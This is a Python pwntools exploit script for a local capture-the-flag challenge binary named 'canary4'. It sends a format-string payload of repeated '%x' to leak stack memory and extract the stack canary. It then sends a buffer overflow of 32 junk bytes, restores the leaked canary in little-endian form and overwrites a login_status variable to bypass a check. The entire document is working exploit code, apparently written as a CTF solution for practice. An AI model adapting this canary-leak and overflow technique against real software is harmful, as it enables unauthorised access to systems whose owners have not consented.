from pwn import *

format_payload = '%x '*12
proc = process('/root/Desktop/CTF/challenges/canary/canary4')

#Recieve 'Enter ID:'
output = proc.recvrepeat(0.5)
print "[*] Recieved: \n"+output

#Send format string payload
proc.sendline(format_payload)

#Recieve 'Enter Data for ID: ... <leaked memory>'
output = proc.recvline(0.5)
print "[*] Recieved: \n"+output
output = output.split()


if len(output) > 13:
	canary = output[11]
	print "[*] Leaked Canary: "+canary

	#Junk bytes to fill buffer
	payload = 'A'*32
	#Convert leaked canary value from string to raw bytes in little endian
	payload += p32(int(canary, 16), endian='little')
	#Append 4 junk bytes to overwrite the login_status variable
	payload += 'BBBB'
	print "[*] Sending payload..."
	proc.sendline(payload)
else:
	print "[*] Error: Canary was not leaked"


output = proc.recvrepeat(0.5)
print "[*] Recieved: \n"+output

proc.close()




